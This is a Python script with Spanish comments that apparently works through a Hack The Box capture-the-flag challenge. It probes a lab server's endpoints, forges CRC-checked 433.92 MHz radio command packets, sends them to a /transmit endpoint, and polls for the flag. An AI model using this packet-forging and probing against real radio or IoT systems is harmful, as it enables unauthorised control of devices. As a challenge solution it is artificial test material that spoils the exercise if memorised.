#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 136: Analizar el código JavaScript en detalle
s = requests.Session()
r = s.get(base_url)

# Buscar URLs ajax
ajax_urls = re.findall(r"url:\s*['\"]([^'\"]+)['\"]", r.text)
print(f"[*] AJAX URLs found: {ajax_urls}")

# El código muestra: url: '/updates'
# Y setInterval cada 1000ms

# INNOVACIÓN 137: Probar POST a /updates
print("\n[*] Trying POST to /updates")
r = s.post(f'{base_url}/updates', data={'test': 'data'})
print(f"POST /updates: {r.status_code}")

# INNOVACIÓN 138: ¿Y si /capture es donde veo el resultado después de enviar comandos?
print("\n[*] Analyzing /capture in detail")
r = s.get(f'{base_url}/capture')
# Buscar patrones conocidos
capture_hex = r.content[:10000].hex().upper()

# Buscar E1FF, etc con el CRC correcto
packets_to_find = [
    'E1FF217D',  # Mi paquete
    'E1FF7D21',  # BE
    'FFE1',
    'A1F1',
]

for pattern in packets_to_find:
    count = capture_hex.count(pattern)
    if count > 0:
        print(f'  Found {pattern}: {count} times in capture')
        # Mostrar contexto
        idx = capture_hex.find(pattern)
        print(f'    Context: {capture_hex[max(0,idx-20):idx+len(pattern)+20]}')

# INNOVACIÓN 139: Tal vez necesito hacer GET repetidamente después de enviar
print("\n[*] Monitoring after sending commands...")
s = requests.Session()
s.get(base_url)

# Enviar todos los comandos
for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]:
    data = bytes([addr, cmd])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})

# Monitorear continuamente
for i in range(60):
    time.sleep(1)
    r = s.get(base_url)
    
    # Buscar cambios
    if i % 10 == 0:
        sensor_states = re.findall(r'spinner-grow (text-\w+)', r.text)
        print(f'  [{i}s] States: {sensor_states}')
    
    if 'HTB{' in r.text:
        print(f'\n[SUCCESS at {i}s]', re.findall(r'HTB\{[^}]+\}', r.text))
        break
    
    # También verificar updates
    if i % 5 == 0:
        r2 = s.get(f'{base_url}/updates')
        if 'success' in r2.text.lower() or 'escape' in r2.text.lower() or 'complete' in r2.text.lower():
            print(f'  [{i}s] Updates: {r2.text[:200]}')
        
        if 'HTB{' in r2.text:
            print(f'\n[SUCCESS in updates at {i}s]', re.findall(r'HTB\{[^}]+\}', r2.text))
            break

print("\n[*] Innovaciones 136-139 completadas")
